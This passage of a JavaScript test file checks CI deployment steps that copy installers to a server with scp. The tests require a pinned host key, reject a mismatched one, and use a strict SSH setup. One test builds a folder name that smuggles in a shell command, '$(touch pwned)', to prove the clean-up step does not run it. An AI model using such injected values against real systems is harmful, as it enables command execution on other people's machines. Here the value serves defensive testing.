      fs.rmSync(runner, { recursive: true, force: true });
      fs.mkdirSync(runner);
      return spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', script(f, name)], {
        cwd: work, encoding: 'utf8',
        env: { ...process.env, PATH: `${bin}:${process.env.PATH}`, RUNNER_TEMP: runner, VPS_HOST: '203.0.113.5', VPS_USER: 'deploy', VPS_SSH_KEY: 'PRIVATE KEY', VPS_DOWNLOADS_DIR: '/srv/hearth/data/downloads', ...extra },
      });
    };
    const copied = () => (fs.existsSync(calls) ? fs.readFileSync(calls, 'utf8') : '');
    for (const f of files) {
      // No pinned fingerprint: nothing is copied, and the log says what to add.
      let r = runStep(f, 'Copy installers to the server', { VPS_HOST_FINGERPRINT: '' });
      assert.notEqual(r.status, 0);
      assert.match(r.stdout, /::error::Add the secret VPS_HOST_FINGERPRINT/);
      assert.equal(copied(), '', `${f}: nothing copied without a pinned host key`);
      // A machine without the pinned key (someone else answering at that address): refused.
      r = runStep(f, 'Copy installers to the server', { VPS_HOST_FINGERPRINT: keys.other.fp });
      assert.notEqual(r.status, 0);
      assert.match(r.stdout, /didn't show the host key that VPS_HOST_FINGERPRINT names/);
      assert.equal(copied(), '');
      // The right one (with or without the SHA256: prefix): copied, trusting only that key, with a private key file.
      for (const fp of [keys.ed.fp, keys.ed.fp.replace(/^SHA256:/, '')]) {
        r = runStep(f, 'Copy installers to the server', { VPS_HOST_FINGERPRINT: fp });
        assert.equal(r.status, 0, r.stdout + r.stderr);
        assert.match(copied(), /^scp -i \S+\/vps-ssh\/key -o IdentitiesOnly=yes -o UserKnownHostsFile=\S+ -o StrictHostKeyChecking=yes .* -- dist\/Hearth-Setup-1\.0\.0\.exe deploy@203\.0\.113\.5:\/srv\/hearth\/data\/downloads\/$/m);
        assert.equal(fs.readFileSync(path.join(t, 'kh-used'), 'utf8'), `${keys.ed.line}\n`);
        assert.equal(fs.readFileSync(path.join(t, 'key-mode'), 'utf8').trim(), '600');
      }
    }
    // The clean-up keeps the two newest of each installer, in a folder whose name the remote shell must not
    // split or run (it reaches the server as one quoted word).
    const cleanup = workflowFiles().filter((f) => stepNamed(f, 'Keep only the two newest of each installer on the server'));
    for (const f of cleanup) {
      const dir = path.join(t, "down loads; it's $(touch pwned)");
      fs.mkdirSync(dir, { recursive: true });
      ['1.0.0', '1.0.1', '1.0.2'].forEach((v, i) => {
        const p = path.join(dir, `Hearth-Setup-${v}.exe`);
        fs.writeFileSync(p, v);
        fs.utimesSync(p, new Date(2026, 0, i + 1), new Date(2026, 0, i + 1));
      });
      const r = runStep(f, 'Keep only the two newest of each installer on the server', { VPS_DOWNLOADS_DIR: dir });
      assert.equal(r.status, 0, r.stdout + r.stderr);
      assert.deepEqual(fs.readdirSync(dir).sort(), ['Hearth-Setup-1.0.1.exe', 'Hearth-Setup-1.0.2.exe']);
      assert.match(copied(), /StrictHostKeyChecking=yes/);
      assert.ok(!fs.existsSync(path.join(work, 'pwned')) && !fs.existsSync(path.join(t, 'pwned')));
    }
  } finally { fs.rmSync(t, { recursive: true, force: true }); }
});
